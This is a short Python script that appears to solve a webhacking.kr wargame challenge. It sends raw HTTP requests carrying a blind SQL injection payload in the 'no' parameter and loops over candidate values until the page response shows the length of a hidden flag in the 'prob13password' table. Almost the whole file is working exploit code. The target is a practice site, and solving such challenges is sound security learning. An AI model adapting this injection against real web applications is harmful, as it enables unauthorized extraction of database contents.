import socket
import re

my_cookie="Cookie Value"

host="Host: webhacking.kr\n"
cookie="Cookie: PHPSESSID=%s\n\n" % my_cookie

web = 'webhacking.kr'
ip = socket.gethostbyname(web)

socket.setdefaulttimeout(5)

s = socket.socket()
s.connect((ip, 80))
for j in range(1,30):
    head1="GET /challenge/web/web-10/index.php?no=if((select(length(min(flag)))from(prob13password))in("
    head2="%d" % j
    head3="),1,2) HTTP/1.1\n"
    s.send(head1+head2+head3+host+cookie)
    aa=s.recv(1024)
    print("j: %d") % (j)
    find = re.findall("1</td>",aa)

    if find:
        s.close()
        print "Length is %d" %j
        exit()
